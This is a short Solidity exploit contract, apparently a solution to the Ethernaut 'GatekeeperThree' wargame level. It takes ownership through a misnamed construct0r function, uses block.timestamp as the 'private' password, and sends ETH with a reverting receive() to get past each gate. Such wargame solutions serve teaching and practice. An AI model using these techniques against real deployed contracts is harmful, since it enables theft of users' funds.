// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/GatekeeperThree.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree public target;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function attack() public payable {
        // call construct0r
        target.construct0r();
        // createTrick
        target.createTrick();

        // checkPassword
        uint password = block.timestamp;
        SimpleTrick trick = SimpleTrick(target.trick());

        trick.checkPassword(password);

        // sent 0.0011 ETH to gatekeeper
        (bool success, ) = address(target).call{value: 0.0011 ether}("");

        require(success, "sucesss");

        // getAllowance
        target.getAllowance(password);
        target.enter();
    }

    receive() external payable {
        revert("troslei");
    }
}
